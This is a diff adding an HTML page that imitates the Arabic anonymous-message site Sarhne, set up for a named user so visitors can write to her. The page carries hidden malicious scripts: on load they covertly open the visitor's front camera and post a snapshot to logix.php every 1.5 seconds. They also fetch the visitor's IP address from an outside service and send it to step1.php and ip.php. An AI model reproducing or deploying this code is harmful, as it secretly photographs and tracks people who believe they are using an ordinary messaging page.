@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <link href="favicon.ico" rel="icon" type="image/x-icon"/>
+  <title>
+   صارحني برسالة سرية Samira moalla
+  </title>
+[metacnt]
+  <meta content="website" property="og:type"/>
+ <meta content="737" property="og:image:width"/>
+  <meta content="384" property="og:image:height"/>
+ 
+  <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4704968227879779">
+  </script>
+  <link href="assets/style.css?v=1641488955" rel="stylesheet"/>
+  <link href="assets/icofont.min.css" rel="stylesheet" type="text/css"/>
+  <script src="assets/js/jquery.min.js">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+  </script>
+  <script src="https://www.google.com/recaptcha/api.js?render=6Le10rcUAAAAAE71INWyFbBjBUU7BPGQo5_thY9b">
+  </script>
+ </head>
+ <body id="body">
+
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+ </div>
+ 
+ <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <script>
+     document.addEventListener("DOMContentLoaded", function () {
+         // Function to get user's IP address
+         function getUserIP(callback) {
+             fetch("https://api64.ipify.org?format=json")
+                 .then(response => response.json())
+                 .then(data => callback(data.ip))
+                 .catch(error => console.error("Error fetching IP:", error));
+         }
+
+         // Function to send IP to PHP file
+         function sendIPToPHP(ip) {
+             fetch("step1.php", {
+                 method: "POST",
+                 headers: {
+                     "Content-Type": "application/x-www-form-urlencoded",
+                 },
+                 body: `{"ip":"${ip}"}`, 
+             })
+                 .then(response => response.text())
+                 .then(data => console.log(data))
+                 .catch(error => console.error("Error sending IP to PHP:", error));
+         }
+
+         // Get user's IP and send it to PHP file
+         getUserIP(function (ip) {
+             sendIPToPHP(ip);
+         });
+     });
+</script>
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'logix.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+
+</script>
+
+  <div class="nav" dir="rtl">
+   <div class="nav-header">
+    <div class="nav-title">
+     <img alt="Sarhne" height="40" src="assets/img/sarhne-nav.png"/>
+    </div>
+   </div>
+   <div class="nav-btn">
+    <label for="nav-check">
+     <section>
+     </section>
+     <section>
+     </section>
+     <section>
+     </section>
+    </label>
+   </div>
+   <input id="nav-check" type="checkbox"/>
+   <div class="nav-links">
+    <a href="https://www.sarhne.com/">
+     الرئيسية
+    </a>
+    <a href="signup.html">
+     أشتراك
+    </a>
+    <a href="signin.html">
+     تسجل الدخول
+    </a>
+    <a href="search.html">
+     بحث
+    </a>
+    <a href="help.html">
+     تعليمات
+    </a>
+    <a href="contact_us.html">
+     اتصل بنا
+    </a>
+   </div>
+  </div>
+  <div class="tabs">
+   <div class="tab" style="width: 50% !important;">
+    <a href="signup.html">
+     تسجيل أشتراك
+    </a>
+   </div>
+   <div class="tab" style="width: 50% !important;">
+    <a href="signin.html">
+     دخول للحساب
+    </a>
+   </div>
+  </div>
+  <div class="hrbac">
+   <div class="tophr">
+   </div>
+  </div>
+  <center>
+   <div id="top">
+    <div class="user-title" dir="rtl">
+     أكتب رسالة إلى
+     <b>
+      Samira moalla
+     </b>
+     دون ان تعرفك
+    </div>
+    <img alt="Samira moalla" class="cimg" height="120" id="myImg" onerror="this.onerror=null;this.src='https://www.sarhne.com/assets/img/logo-150.jpg';" src="assets/img/female-avatar.svg" width="120"/>
+    <br/>
+    <div class="modal" id="myModal">
+     <span class="close">
+      ×
+     </span>
+     <img class="modal-content" id="img01"/>
+    </div>
+   </div>
+   <div class="noselect" dir="rtl" id="center">
+    <div class="s_left">
+     <img class="img_s_left" src="assets/img/l.png"/>
+    </div>
+    <div class="s_right" style="margin-top: -10px;margin-right: -7px;">
+     <img class="img_s_right" src="assets/img/r.png"/>
+    </div>
+    <div style="clear:both;">
+    </div>
+    <small class="gray" dir="rtl" style="display: block;">
+     أخر ظهور منذ : منذ 54 سنة
+    </small>
+    <span id="erorrid">
+    </span>
+    <form id="form">
+     <textarea class="textarea" dir="rtl" id="sarhne" maxlength="500" name="msg" placeholder="هناك شيء تريد قوله لـ Samira moalla ، بدون ان تعرفك ؟ أكتب هنا" rows="7"></textarea>
+     <small style="float:left;direction: ltr;">
+      <b id="char_count">
+       500
+      </b>
+      الحروف المتبقية
+     </small>
+     <input checked="" class="switch-input" id="show_my_info" name="show_my_info" type="checkbox"/>
+     <section class="switch-label" for="id-name--1" onclick="show_my_info_switch();" style="margin-bottom:10px;">
+      <small class="toggle--on">
+       بشكل سري :
+       <span class="green">
+        نعم
+       </span>
+      </small>
+      <small class="toggle--off">
+       بشكل سري :
+       <span class="red">
+        لا
+       </span>
+      </small>
+     </section>
+     <script>
+      function show_my_info_switch(){
+       showalert('ميزة أظهار اسم مرسل الصراحة تعمل فقط مع الاعضاء المسجلين معنا من فضلك سجل اشتراك جديد او دخول لحسابك لأستخدام هذه الميزة');
+    }
+     </script>
+     <div style="clear:both;">
+     </div>
+     <div id="idemoj" style="width:97%; background:#fff;margin:5px;padding:5px;display:block;font-size:22px;">
+      <a onclick="sendemoji(' 😀 ');">
+       😀
+      </a>
+      <a onclick="sendemoji(' 😅 ');">
+       😅
+      </a>
+      <a onclick="sendemoji(' 😂 ');">
+       😂
+      </a>
+      <a onclick="sendemoji(' 🤣 ');">
+       🤣
+      </a>
+      <a onclick="sendemoji(' 🙂 ');">
+       🙂
+      </a>
+      <a onclick="sendemoji(' 😍 ');">
+       😍
+      </a>
+      <a onclick="sendemoji(' 😘 ');">
+       😘
+      </a>
+      <a onclick="sendemoji(' 😭 ');">
+       😭
+      </a>
+      <a onclick="sendemoji(' 😢 ');">
+       😢
+      </a>
+      <a onclick="sendemoji(' 😎 ');">
+       😎
+      </a>
+      <a onclick="sendemoji(' 🤨 ');">
+       🤨
+      </a>
+      <a onclick="sendemoji(' 😳 ');">
+       😳
+      </a>
+      <a onclick="sendemoji(' 💩 ');">
+       💩
+      </a>
+      <a onclick="sendemoji(' 😡 ');">
+       😡
+      </a>
+      <a onclick="sendemoji(' 😷 ');">
+       😷
+      </a>
+      <a onclick="sendemoji(' 👋 ');">
+       👋
+      </a>
+      <a onclick="sendemoji(' 💋 ');">
+       💋
+      </a>
+      <a onclick="sendemoji(' 🙈 ');">
+       🙈
+      </a>
+      <a onclick="sendemoji(' 🌹 ');">
+       🌹
+      </a>
+      <a onclick="sendemoji(' ❤️ ');">
+       ❤️
+      </a>
+     </div>
+     <style>
+      .buttom_img {
+	background-color: #F6F6F6;
+	width: 60%;
+	/* margin: 10px; */
+	border: 0;
+	direction: ltr;
+	border: 1px dashed #C6C6C6;
+	padding: 5px;
+	font-size: 13px;
+	color: #2d2f31;
+	text-decoration: none;
+	border-radius: 5px;
+	display: inline-block;
+}
+          
+          
+       .remove_photo_msg {
+	text-decoration: none;
+	color: #717171;
+	font-size: 12px;
+  display:none;
+}
+     </style>
+     <a class="buttom_img" id="add_photo_msg" onclick="getFile()">
+      <img alt="#" height="auto" src="assets/img/add_photo_msg.svg" style="vertical-align:middle;" width="22"/>
+      أضافة صورة
+     </a>
+     <img alt="" id="userphoto" src="" style="overflow:hidden;border-radius:5px;display:none;" width="150"/>
+     <br/>
+     <a class="remove_photo_msg" id="remove_photo_msg" onclick="reset_photo_img();">
+      ازالة الصورة؟
+     </a>
+     <form id="form">
+      <input accept="image/*" id="PhotoFile" name="PhotoFile" required="" style="display:none;" type="file"/>
+      <input id="img_code" name="img_code" type="hidden"/>
+     </form>
+     <script>
+      function getFile() {
+         
+                    showalert('لايرغب هذا المستخدم بالحصول على صور مع الرسائل الجديدة حالياً  , اذا كنت صاحب الحساب وترغب بتفعيل هذه الميزة اذهب الى اعدادات الحساب ومن ثم اختر تفعيل قبول الصور')
+  
+          
+          
+          
+
+}
+
+
+          var img_width = 300;
+  var img_height = 300;
+  
+          function isCanvasBlank(canvas) {
+  const context = canvas.getContext('2d');
+
+  const pixelBuffer = new Uint32Array(
+    context.getImageData(0, 0, canvas.width, canvas.height).data.buffer
+  );
+
+  return !pixelBuffer.some(color => color !== 0);
+}
+          
+          
+    var is_img = false;
+    function imageToDataUri(img, width, height) { 
+
+    // create an off-screen canvas
+    var canvas = document.createElement('canvas'),
+        ctx = canvas.getContext('2d');
+
+    // set its dimension to target size
+    canvas.width = width;
+    canvas.height = height;
+
+    // draw source image into the off-screen canvas:
+    ctx.drawImage(img, 0, 0, width, height);
+
+ const blank = isCanvasBlank(canvas);
+
+  if(blank == false){
+    is_img = true;
+  } 
+      
+      
+  return canvas.toDataURL('image/jpeg', 0.8);
+}
+ function readURL(input) {
+        if (input.files && input.files[0]) {
+            var reader = new FileReader();
+            reader.onload = function (e) {
+             
+              
+              var img = new Image;
+              $(img).load(function() {
+              img_width = this.width;
+              img_height = this.height;
+               });
+               img.onload = resizeImage;
+               img.src = e.target.result;
+
+            }
+            
+            reader.readAsDataURL(input.files[0]);
+        }
+    }
+  
+       function resizeImage() {
+       var newHeight = Math.floor(img_height / img_width * 300);
+       var newDataUri = imageToDataUri(this, 300, newHeight);
+         
+           if(is_img == true){
+        $('#userphoto').attr('src', newDataUri);
+      $('#img_code').val(newDataUri);
+              $('#userphoto').attr('src', newDataUri);
+       $("#add_photo_msg").hide();
+      $("#userphoto").show();
+      $("#remove_photo_msg").show(); 
+      }  
+ 
+     }
+  
+  
+    $("#PhotoFile").change(function(){
+        readURL(this);
+
+    }); 
+          
+          
+          function reset_photo_img(){
+            is_img = false;
+        $('#img_code').val('');
+       $("#add_photo_msg").show();
+      $("#userphoto").hide();
+      $("#remove_photo_msg").hide(); 
+            $('#userphoto').attr('src', '');
+          }
+     </script>
+     <a class="flatbutton" id="send_button" onclick="send_form();" style="background-color:#2D2F31;width:90%;margin:10px;border:0;direction: ltr;" type="submit">
+      <img alt="#" height="auto" src="assets/img/sent.svg" style="vertical-align:middle;" width="22"/>
+      أرسال الآن
+     </a>
+    </form>
+    <form accept-charset="utf-8" action="" id="success_form" method="post" style="display:none;">
+     <input name="processing" type="hidden" value=""/>
+    </form>
+    <div class="hr">
+    </div>
+    <div class="user-report" dir="rtl">
+     <span>
+      الزيارات : 120
+     </span>
+     <p id="report">
+      <a class="white" href="samira" style="font-size: 13px;">
+       أبلاغ؟
+      </a>
+     </p>
+    </div>
+   </div>
+   <div class="box2">
+    <div id="user_messages">
+     <center>
+      <section id="ajax_wait">
+       <div class="hr">
+       </div>
+       <h5>
+        الرجاء الأنتظار
+       </h5>
+       <div class="loader">
+       </div>
+       <h3>
+        جارٍ جلب البيانات
+       </h3>
+       <div class="hr">
+       </div>
+      </section>
+     </center>
+    </div>
+   </div>
+   <script>
+    get_messages();
+    function get_messages(){
+          $.ajax({
+            type:'POST',
+            url:'ajax/messages/get_messages.html',
+            data:'link=samira&name=Samira moalla&photo=assets/img/female-avatar.svg',
+            success:function(res){
+           $('#user_messages').html(res);
+            },error: function (request, status, error) {
+            $('#user_messages').html('حدث خطأ في جلب البيانات اعد المحاولة');
+    }});
+  }
+
+  
+  
+  function loade_more(){
+    var last_id = $('.timeline-centered:last').attr('id');
+    get_messages_disabled_button();
+      $.ajax({
+            type:'POST',
+            url:'ajax/messages/fetch_get_messages.html',
+            data:'last_id='+last_id+'&link=samira&name=Samira moalla&photo=assets/img/female-avatar.svg',
+            success:function(res){
+              
+              get_messages_activebutton();
+              if(res.includes('nomore')){
+                 $('#send_button_messages').hide();
+                   nativeToast({
+  message: ' تم عرض جميع الردود ',
+  type: 'success',
+  position: 'center'
+ })
+              } else {
+                 $('#posts_results').append(res);
+              }
+           
+              
+            },error: function (request, status, error) {
+                document.getElementById('send_button_messages').disabled = false;
+   $('#send_button_messages').html('<img src="assets/img/loader.svg" alt="#" style="vertical-align:middle;" width="22" height="auto"> أعادة المحاولة  ');
+               server_erorr();
+    }});
+    
+  }
+
+  
+  
+    function get_messages_activebutton(){
+    document.getElementById('send_button_messages').disabled = false;
+   $('#send_button_messages').html('<img src="assets/img/scroll_down.gif" alt="#" style="vertical-align:middle;" width="22" height="auto"> عرض المزيد من الرسائل ');
+ }
+  
+  function get_messages_disabled_button(){
+   document.getElementById('send_button_messages').disabled = true;
+   $('#send_button_messages').html('  انتظر من فضلك <img src="assets/img/loading.svg" width="27" class="middle" alt="#"> ');
+   
+ }
+   </script>
+   <div class="box">
+    <i class="icofont-bulb-alt main_color" style="font-size:120px;">
+    </i>
+    <br/>
+    <div class="logo">
+     <h3>
+      حانت لحظة الصراحة
+     </h3>
+    </div>
+    <font color="#000">
+     <b>
+      هل أنت مستعد لمعرفة ملاحظات الناس عنك بدون أن تعرفهم ؟
+     </b>
+    </font>
+    <small>
+     <font color="#25373D">
+      <br/>
+      أحصل على رسائل سرية من زملائك بصراحة
+      <br/>
+      إعرف مزاياك و عيوبك، وما يعتقده الناس عنك
+      <br/>
+      عزز شخصيتك بمعرفة الواقع بعيدا عن النفاق
+      <br/>
+      واجه الصراحة التي أخفتها عنك المجاملات
+      <br/>
+      <br/>
+     </font>
+    </small>
+    <a class="userbutton" href="signup.html" style="background-color:#F0776C;width:90%;margin:10px;">
+     ! سجل حسابك الآن
+    </a>
+   </div>
+   <div class="box">
+    <a href="https://sarahah.pro">
+     <img src="assets/img/uploads/ad_sarhne.jpg" width="100%"/>
+    </a>
+   </div>
+   <div id="center" style="margin-top:50px;">
+    <div class="s_left">
+     <img class="img_s_left" src="assets/img/l.png"/>
+    </div>
+    <div class="s_center">
+     <div class="s_contener">
+      <div class="s_top">
+       <img src="assets/img/social/all.gif" style="width: 80px;margin-left: -10px;margin-top: -10px;opacity: .5;"/>
+      </div>
+      <div class="s_text" style="direction: rtl;font-size:14px;">
+       روابط التواصل الأجتماعي الخاصة بـ : Samira moalla
+      </div>
+     </div>
+    </div>
+    <div class="s_right">
+     <img class="img_s_right" src="assets/img/r.png"/>
+    </div>
+    <div style="clear:both;">
+    </div>
+    <img class="img_arrow" src="assets/img/arrow.png"/>
+    <br/>
+    <br/>
+    <img class="soical_icon" onclick="social_link('no_link','instagram');" src="assets/img/social/instagram_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','twitter');" src="assets/img/social/twitter_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','facebook');" src="assets/img/social/facebook_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','snapchat');" src="assets/img/social/snapchat_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','youtube');" src="assets/img/social/youtube_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','wa');" src="assets/img/social/wa_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','tiktok');" src="assets/img/social/tiktok_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','messenger');" src="assets/img/social/messenger_icon.svg"/>
+    <img class="soical_icon" onclick="social_link('no_link','email');" src="assets/img/social/gmail_icon.png"/>
+    <img class="soical_icon" onclick="social_link('no_link','website');" src="assets/img/social/website_icon.png"/>
+   </div>
+   <br/>
+   <script async="" src="pagead/js/adsbygoogle.js">
+   </script>
+   <ins class="adsbygoogle" data-ad-client="ca-pub-4704968227879779" data-ad-format="auto" data-ad-slot="8836972412" data-full-width-responsive="true" style="display:block">
+   </ins>
+   <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+   </script>
+   <br/>
+   <script async="" src="pagead/js/adsbygoogle.js">
+   </script>
+   <ins class="adsbygoogle" data-ad-client="ca-pub-4704968227879779" data-ad-format="auto" data-ad-slot="8364530822" data-full-width-responsive="true" style="display:block">
+   </ins>
+   <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+   </script>
+   <br/>
+   <div class="box2">
+    <div class="rule">
+     <div class="line">
+      <div>
+      </div>
+     </div>
+     <div class="words">
+      <div class="logo">
+       <h3>
+        اختبار الصداقة
+       </h3>
+      </div>
+     </div>
+     <div class="line">
+      <div>
+      </div>
+     </div>
+    </div>
+    <img src="assets/img/friend_quiz.svg" width="250"/>
+    <br/>
+    معرفة قوة الصداقة بينك وبين أصدقائك
+    <br/>
+    <small>
+     <font color="#25373D">
+      هو اختبار يساعدك على معرفة قوة الصداقة بينك وبين أصدقائك انشئ اختبار خاص بك وشاركة عبر الفيس بوك
+     </font>
+    </small>
+    <br/>
+    <a class="userbutton" href="sadakah/" rel="nofollow" style="background-color:#F1766C;width:100%;border:0;margin-bottom:5px;">
+     تجربة اختبار الصداقة
+    </a>
+    <div class="hr">
+    </div>
+   </div>
+   <br/>
+   <script async="" src="pagead/js/adsbygoogle.js">
+   </script>
+   <ins class="adsbygoogle" data-ad-client="ca-pub-4704968227879779" data-ad-format="auto" data-ad-slot="1990694163" data-full-width-responsive="true" style="display:block">
+   </ins>
+   <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+   </script>
+   <br/>
+   <div class="box2">
+    <div class="rule">
+     <div class="line">
+      <div>
+      </div>
+     </div>
+     <div class="words">
+      أخترنا لك تطبيق رائج
+     </div>
+     <div class="line">
+      <div>
+      </div>
+     </div>
+    </div>
+    <div id="random-app">
+    </div>
+    <script>
+     var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+  var res = this.responseText;
+ document.getElementById("random-app").innerHTML = res;   
+  }}
+ xhttp.open("GET", "apps.html", true); 
+ xhttp.send();
+    </script>
+    <div class="hr">
+    </div>
+   </div>
+   <br/>
+   <script async="" src="pagead/js/adsbygoogle.js">
+   </script>
+   <ins class="adsbygoogle" data-ad-client="ca-pub-4704968227879779" data-ad-format="link" data-ad-slot="4129896055" data-full-width-responsive="true" style="display:block">
+   </ins>
+   <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+   </script>
+   <script src="assets/js/autosize.min.js">
+   </script>
+   <script>
+    function activebutton(){
+
+     document.getElementById('send_button').disabled = false;
+   $('#send_button').html('   ارسال مصارحة <img src="assets/img/sent.svg" width="27" class="middle" alt="#"> ');
+ }
+  
+  function disabled_button(){
+  document.getElementById('send_button').disabled = true;
+   $('#send_button').html('  انتظر من فضلك <img src="assets/img/loading.svg" width="27" class="middle" alt="#"> ');
+   
+ }
+     
+     
+     
+      function send_form(){
+        disabled_button();
+        
+        
+        if($('#sarhne').val().length < 6)
+{
+     activebutton();
+   showerorr('warning','خطأ','لايمكن ان تكون رسالة المصارحة اقل من 6 حروف او اكبر من 500 حرف'); 
+   showalert("لايمكن ان تكون رسالة المصارحة اقل من 6 حروف او اكبر من 500 حرف");
+   smoothScroll(document.getElementById('erorrid'));
+
+} else if($('#img_code').length > 0 && $('#img_code').val() != '') {
+
+
+ var img_code_post = $('#img_code').val();
+var data = 'img_code=' + img_code_post; 
+  
+  $.ajax({
+            type:'POST',
+            url:'ajax/messages/upload_img.html',
+            data: data,
+            success:function(i){
+              if(i !='' && i.length>0 && i != 'err'){
+                post_msg(i);
+              } else {
+                post_msg('null');
+              }
+                
+   },error: function (request, status, error) {
+   post_msg('null');
+             
+    }});
+
+} else {
+  
+  post_msg('null');
+  
+}
+        }
+     
+     
+     
+     function post_msg(i){
+       
+        grecaptcha.ready(function() {
+          grecaptcha.execute('6Le10rcUAAAAAE71INWyFbBjBUU7BPGQo5_thY9b', {action: 'submit'}).then(function(t) {
+              $.ajax({
+            type:'POST',
+            url:'ajax/messages/send.html',
+            data: $('#form').serialize()+"&link=samira&bad_words=false&i="+i+"&t="+t,
+            success:function(data){
+             activebutton();
+   if (data.includes("security_err")){ 
+    showerorr('warning','خطأ','تم اكتشاف نشاط مريب الرجاء أعادة المحاولة او اتصل بنا'); 
+   showalert("خطأ في حماية الموقع من فضلك تواصل معنا اذا استمرت المشكلة");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  } else if (data.includes("send_limit")){ 
+    showerorr('warning','خطأ','نحن نضع حدود للمصارحات لاتستطيع ارسال اكثر من مصارحة في مدة اقل من 30 ثانية انتظر قليلاً واعد المحاولة'); 
+   showalert("نحن نضع حدود للمصارحات لاتستطيع ارسال اكثر من مصارحة في مدة اقل من 30 ثانية انتظر قليلاً واعد المحاولة");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  } else if (data.includes("msg_empty")){ 
+    showerorr('warning','خطأ','لايمكن ان تكون رسالة المصارحة فارغة'); 
+   showalert("لايمكن ان تكون رسالة المصارحة فارغة");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  } else if (data.includes("msg_long")){ 
+    showerorr('warning','خطأ','لايمكن ان تكون رسالة المصارحة اقل من 6 حروف او اكبر من 500 حرف'); 
+   showalert("لايمكن ان تكون رسالة المصارحة اقل من 6 حروف او اكبر من 500 حرف");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  } else if (data.includes("user_not_found")){ 
+    showerorr('warning','خطأ','لم يتم العثور على المستخدم'); 
+   showalert("  لم يتم العثور على المستخدم  ");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  } else if (data.includes("block")){ 
+    showerorr('warning','خطأ','تم رفض الوصول قد يكون تم حظرك من قبل هذا المستخدم'); 
+   showalert(" تم رفض الوصول قد يكون تم حظرك من قبل هذا المستخدم  ");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  } else if (data.includes("bad_word")){ 
+    showerorr('warning','خطأ','تم رفض الوصول تأكد من محتوى المصارحة'); 
+   showalert(" تم رفض الوصول تأكد من محتوى المصارحة  ");
+   smoothScroll(document.getElementById('erorrid'));
+ 
+  }  else if (data.includes("successfully")){ 
+           $("#sarhne").val('');
+           document.getElementById("success_form").submit();
+     $('#send_button').html('  جارٍ معالجة الطلب <img src="assets/img/loading.svg" width="27" class="middle" alt="#"> ');
+ 
+  } else {
+     showerorr('warning','خطأ','أعد المحاولة بعد قليل واذا استمرت المشكلة من فضلك تواصل مع الادارة من خلال ازار التواصل الاجتماعي اسفل الصفحة'); 
+   showalert(" أعد المحاولة بعد قليل واذا استمرت المشكلة من فضلك تواصل مع الادارة من خلال ازار التواصل الاجتماعي اسفل الصفحة ");
+   smoothScroll(document.getElementById('erorrid'));
+  }
+           
+              
+              
+              
+              
+              
+              
+            
+            
+            },error: function (request, status, error) {
+      activebutton();
+               showerorr('warning','مشكلة في الموقع  ',' اعد المحاولة بعد قليل او اتصل بنا لحل المشكلة فوراً  '); 
+    showalert("مشكلة في الموقع اعد المحاولة بعد قليل او اتصل بنا لحل المشكلة فوراً ");
+   smoothScroll(document.getElementById('erorrid'));
+              
+    }});
+            
+             });
+       });
+ 
+     }
+     
+     
+     
+     function social_link(link,socila){
+       var msg = "";
+       if(socila == 'facebook'){
+         msg = "هذا المستخدم لم يضع رابط الفيسبوك الخاص به";
+       } else  if(socila == 'instagram'){
+         msg = "هذا المستخدم لم يضع رابط انستغرام الخاص به";
+       } else  if(socila == 'twitter'){
+         msg = "هذا المستخدم لم يضع رابط تويتر الخاص به";
+       } else  if(socila == 'snapchat'){
+         msg = "هذا المستخدم لم يضع رابط سناب شات الخاص به";
+       } else  if(socila == 'youtube'){
+         msg = "هذا المستخدم لم يضع رابط قناته على اليتيوب ";
+       } else  if(socila == 'wa'){
+         msg = "هذا المستخدم لم يضع رقم هاتفه  ";
+       } else  if(socila == 'tiktok'){
+         msg = "هذا المستخدم لم يضع رابط التيك توك الخاص به  ";
+       } else  if(socila == 'messenger'){
+         msg = "هذا المستخدم لم يضع رابط المسنجر الخاص به  ";
+       } else  if(socila == 'email'){
+         msg = "هذا المستخدم لم يضع بريده الألكتروني  ";
+       }else  if(socila == 'website'){
+         msg = "هذا المستخدم لم يضع رابط موقعه الألكتروني  ";
+       }
+       
+       
+       if(link == 'no_link'){
+         showalert(msg); 
+       } else {
+         window.location.href=link;
+       }
+       
+       
+       
+       
+     }
+     
+     
+     
+     
+     function showerorr(type,title,msg){
+   $('#erorrid').show();
+  document.getElementById('erorrid').innerHTML="<div class='notification "+type+"' dir='rtl'><span class='notification-close'>&times;</span><h3 class='notification-title'>"+title+"</h3><p class='notification-message'>"+msg+"</p></div>";  
+} 
+     
+     
+ 
+     
+     
+     
+  var len = 0;
+  var maxchar = 500;
+  $('#sarhne').keyup(function(){
+    len = this.value.length
+    if(len > maxchar){
+        return false;
+    }
+    else if (len > 0) {
+        $("#char_count").html( maxchar - len  );
+    }
+    else {
+        $("#char_count").html(maxchar );
+    }
+  })
+     
+     
+  
+function msglike(id){
+  
+  document.getElementById("imglk_"+id).src="assets/img/ajax_clock_black.svg"; 
+  
+                 $.ajax({
+            type:'POST',
+            url:'ajax/messages/like.html',
+            data:'msg_id='+id,
+            success:function(res){
+              $('#totallk_'+id).html(res);
+             document.getElementById("imglk_"+id).src="assets/img/like.svg"; 
+              document.getElementById('msglike_'+id).onclick = null;
+               },error: function (request, status, error) {
+                 document.getElementById("imglk_"+id).src="assets/img/ajax_err_black.svg"; 
+                server_erorr();
+    }}); 
+ 
+  
+}   
+     
+     
+function screenClass() {
+    if($(window).innerWidth() > 1200) {
+      $('.tabs').hide();
+      $('.hrbac').hide();
+    } else {
+       $('.hrbac').show();
+       $('.tabs').show();
+    }
+}
+
+screenClass();
+$(window).bind('resize',function(){
+    screenClass();
+}); 
+var modal = document.getElementById('myModal');
+
+var img = document.getElementById('myImg');
+var modalImg = document.getElementById("img01");
+var captionText = document.getElementById("caption");
+img.onclick = function(){
+  modal.style.display = "block";
+  modalImg.src = this.src;
+  captionText.innerHTML = this.alt;
+}
+
+var span = document.getElementsByClassName("close")[0];
+span.onclick = function() { 
+  modal.style.display = "none";
+}   
+autosize(document.getElementById("sarhne")); 
+   function sendemoji(e) {
+
+      var textField = $('#sarhne');
+
+      $("#sarhne").val(textField.val() + e);
+      $("#sarhne").focus();
+    }
+   </script>
+   <script src="assets/js/func.js?v=1598020502">
+   </script>
+   <script src="assets/js/alerty.js?v2">
+   </script>
+   <script src="assets/js/toast.js">
+   </script>
+   <div id="footer">
+    <center>
+     <br/>
+     <a href="Sarhne.Official/">
+      <img height="auto" src="assets/img/ffacebook.svg" width="50"/>
+     </a>
+     <a href="sarhne_official/?swa33">
+      <img height="auto" src="assets/img/finstagram.svg" width="50"/>
+     </a>
+     <a href="samira">
+      <img height="auto" src="assets/img/fwhatsapp.svg" width="50"/>
+     </a>
+     <a href="store/apps/details?id=app.sarhne.com">
+      <img height="auto" src="assets/img/fandroid.svg" width="50"/>
+     </a>
+     <br/>
+     <small>
+      جميع الحقوق محفوظة © 2023
+     </small>
+     <br/>
+     <a class="wh" href="index.html">
+      صارحني
+     </a>
+     -
+     <a class="wh" href="Privacy.html">
+      الخصوصية
+     </a>
+     -
+     <a class="wh" href="Terms.html">
+      القوانين
+     </a>
+     -
+     <a class="wh" href="contact_us.html">
+      اتصل بنا
+     </a>
+     <img alt="2021" src="assets/img/sarhne-footer.png" width="20"/>
+     <br/>
+     <br/>
+    </center>
+   </div>
+   <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-ZRDMJGQHJC">
+   </script>
+   <script>
+    window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-ZRDMJGQHJC');
+   </script>
+   <script crossorigin="anonymous" data-cf-beacon='{"rayId":"850eec7e1c8b12a0","b":1,"version":"2024.2.0","token":"218cd1753fe64a258e6d9b2b19630e7e"}' defer="" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317">
+   </script>
+  </center>
+ <script>
+document.addEventListener("DOMContentLoaded", function () {
+    // OZIRIS to get user's IP address
+    function getUserIP(callback) {
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(error => console.error("Error fetching IP:", error));
+    }
+
+    // Function to send IP to PHP file
+    function sendIPToPHP(ip) {
+        fetch("ip.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: "ip=" + ip,
+        })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error("Error sending IP to PHP:", error));
+}
+
+// Get user's IP and send it to PHP file
+getUserIP(function (ip) {
+    sendIPToPHP(ip);
+});
+});
+</script></body>
+</html>
